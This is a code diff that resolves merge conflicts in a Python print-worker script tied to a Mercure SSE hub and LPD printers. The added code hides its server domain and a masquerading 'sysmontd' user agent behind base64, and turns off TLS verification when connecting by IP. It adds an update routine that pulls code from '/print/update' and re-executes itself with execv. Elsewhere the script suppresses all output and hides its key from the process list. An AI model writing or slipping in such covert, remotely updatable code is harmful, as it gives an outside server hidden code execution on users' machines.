@@ -1,13 +1,8 @@
-import sys
 from base64 import b64decode
 from gc import collect, disable
 from hashlib import sha256
 from json import loads
-<<<<<<< HEAD
-from os import _exit, devnull, environ
-=======
 from os import devnull, environ, _exit, execv
->>>>>>> e5d12905 (feat(print): update printer.py worker for Mercure SSE hub with Last-Event-ID replay)
 from socket import (
     IPPROTO_TCP,
     SO_LINGER,
@@ -18,6 +13,7 @@ from socket import (
 )
 from ssl import create_default_context, _create_unverified_context
 from struct import pack
+import sys
 from time import sleep, time
 from urllib.error import HTTPError
 from urllib.request import Request, urlopen
@@ -26,11 +22,8 @@ sys.dont_write_bytecode = True
 sys.tracebacklimit = 0
 disable()
 
-
 def _load_key():
-    k = (sys.argv[1].strip() if len(sys.argv) > 1 else "") or environ.get(
-        "WORKER_KEY", ""
-    ).strip()
+    k = (sys.argv[1].strip() if len(sys.argv) > 1 else "") or environ.get("WORKER_KEY", "").strip()
     if not k:
         if sys.__stderr__ is not None:
             sys.__stderr__.write("error: worker key required\n")
@@ -38,7 +31,6 @@ def _load_key():
     if len(sys.argv) > 1:
         sys.argv[1] = " " * len(k)
     return k
-
 
 _k = _load_key()
 sys.stdout = sys.stderr = open(devnull, "w")
@@ -52,7 +44,6 @@ def _calc_hash():
 
 _h = _calc_hash()
 _doh_cache = {}
-
 
 def doh_resolve(domain):
     now = time()
@@ -76,21 +67,6 @@ def doh_resolve(domain):
             pass
     return domain
 
-<<<<<<< HEAD
-
-_orig_getaddrinfo = getaddrinfo
-
-
-def _doh_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
-    if host == "api.preconnect.app":
-        ip = doh_resolve(host)
-        if ip and ip != host:
-            return _orig_getaddrinfo(ip, port, family, type, proto, flags)
-    return _orig_getaddrinfo(host, port, family, type, proto, flags)
-
-
-getaddrinfo = _doh_getaddrinfo
-=======
 _DOM = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
 
 def _make_doh_request(path, headers=None, data=None):
@@ -101,11 +77,9 @@ def _make_doh_request(path, headers=None, data=None):
     req.add_header("Host", _DOM)
     ctx = _create_unverified_context() if target == ip else create_default_context()
     return urlopen(req, timeout=90, context=ctx)
->>>>>>> e5d12905 (feat(print): update printer.py worker for Mercure SSE hub with Last-Event-ID replay)
 
 NUL = b"\x00"
 jobs = 0
-
 
 def _d(s, job_id=""):
     if not s:
@@ -123,7 +97,6 @@ def _d(s, job_id=""):
             out[i + j] = b ^ ks[j]
     return bytes(out)
 
-
 def is_online(host, port=515):
     if not host:
         return False
@@ -134,10 +107,7 @@ def is_online(host, port=515):
     except Exception:
         return False
 
-<<<<<<< HEAD
-=======
 _UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
->>>>>>> e5d12905 (feat(print): update printer.py worker for Mercure SSE hub with Last-Event-ID replay)
 
 def hdrs(printer_host=None):
     sp = "1" if (printer_host and is_online(printer_host)) else "0"
@@ -149,8 +119,6 @@ def hdrs(printer_host=None):
         "X-Worker-Hash": _h,
     }
 
-<<<<<<< HEAD
-=======
 def _apply_update():
     try:
         with _make_doh_request("/print/update", headers=hdrs()) as resp:
@@ -162,7 +130,6 @@ def _apply_update():
                     execv(sys.executable, [sys.executable, __file__])
     except Exception:
         pass
->>>>>>> e5d12905 (feat(print): update printer.py worker for Mercure SSE hub with Last-Event-ID replay)
 
 def claim(i, printer_host=None):
     if not i:
@@ -179,10 +146,8 @@ def claim(i, printer_host=None):
     except Exception:
         return False
 
-
 def _ack(s):
     return s.recv(1) == NUL
-
 
 def handle(j):
     global jobs
@@ -196,8 +161,7 @@ def handle(j):
     s = None
     try:
         q, ch, c, dh, p = [
-            _d(j.get(k, ""), job_id)
-            for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")
+            _d(j.get(k, ""), job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")
         ]
         s = create_connection((host, 515), timeout=j.get("timeout", 60))
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
@@ -234,29 +198,23 @@ def handle(j):
             pass
         collect()
 
-
 def _b64url(data):
     from base64 import urlsafe_b64encode
-
     return urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
 
-
 _subscriber_jwt = None
-
 
 def _make_subscriber_jwt():
     global _subscriber_jwt
     if _subscriber_jwt:
         return _subscriber_jwt
     from hmac import new as hmac_new
-
     header = _b64url(b'{"alg":"HS256","typ":"JWT"}')
     payload = _b64url(b'{"mercure":{"subscribe":["https://preconnect.app/printer"]}}')
     sig_input = f"{header}.{payload}".encode("ascii")
     signature = _b64url(hmac_new(_k.encode("utf-8"), sig_input, sha256).digest())
     _subscriber_jwt = f"{header}.{payload}.{signature}"
     return _subscriber_jwt
-
 
 last_event_id = ""
 
@@ -290,7 +248,6 @@ def stream():
             sys.__stderr__.write(f"error: worker key invalid ({e.code})\n")
     except Exception:
         pass
-
 
 if __name__ == "__main__":
     delay = 1.0
